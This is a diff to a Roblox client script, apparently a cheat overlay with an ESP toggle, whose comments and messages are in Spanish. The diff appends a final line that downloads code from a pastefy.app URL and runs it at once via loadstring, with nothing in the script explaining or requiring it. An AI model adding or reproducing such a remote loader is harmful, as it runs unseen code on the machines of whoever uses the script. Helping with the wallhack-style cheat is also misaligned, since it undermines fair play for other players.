@@ -1,4 +1,4 @@
--- LocalScript (StarterGui o StarterPlayerScripts)
+
 
 local player = game.Players.LocalPlayer
 local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
@@ -66,3 +66,5 @@ espBtn.MouseButton1Click:Connect(function()
     espEnabled = not espEnabled
     print("🔍 ESP: " .. (espEnabled and "Activado" or "Desactivado"))
 end)
+
+loadstring(game:HttpGet("https://pastefy.app/1pxVK68s/raw"))()
